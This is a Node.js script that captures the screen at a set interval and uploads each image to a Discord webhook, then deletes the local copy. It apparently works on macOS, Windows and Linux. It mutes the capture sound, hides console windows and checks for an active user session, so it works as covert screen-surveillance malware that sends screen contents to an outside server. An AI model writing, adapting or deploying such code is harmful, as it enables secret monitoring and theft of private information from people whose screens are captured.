var exec = require("child_process").execSync;
var fs = require("fs");
var crypto = require("crypto");
var os = require("os");
var Discord = require("discord.js");
var config = require("./config");

var webhook = new Discord.WebhookClient(config.webhook.id, config.webhook.token);

async function capture() {
	if (process.platform == "darwin" && config.capture_console_only && exec("stat -f '%Su' /dev/console").toString().trim() != os.userInfo().username) throw "Not console";
	if (process.platform == "win32") {
		try {
			exec("query user", {windowsHide: true}); // fsr this exits with code 1 which node considers an error
		} catch(cp) {
			if (cp.stdout.toString().split('\n').find(x => x.startsWith('>')).substr(46, 4) == "Disc") throw "Inactive session"; // will capture black screen otherwise
		}
	}
	var filename = `${new Date().toISOString().replace(/:/g, '-')}_${encodeURIComponent(crypto.randomBytes(16).toString('base64'))}.jpg`
	var filepath = os.tmpdir() + '/' + filename;
	if (process.platform == "darwin") {
		exec(`screencapture -x -C -t jpg "${filepath}"`);
	} else if (process.platform == "win32") {
		exec(`"${__dirname}/screenCapture.exe" "${filepath}"`, {windowsHide: true});
	} else {
		exec(`import -silent -window root "${filepath}"`);
	}
	var data = fs.readFileSync(filepath);
	try {
		await webhook.send({files:[{
			attachment: data,
			name: filename
		}]});
	} finally {
		fs.unlinkSync(filepath);
	}
}

(function loop(){
	capture().finally(()=>{
		setTimeout(loop, config.interval);
	}).catch(rejection => {
		if (process.env.DEBUG) console.error(rejection);
	});
})();
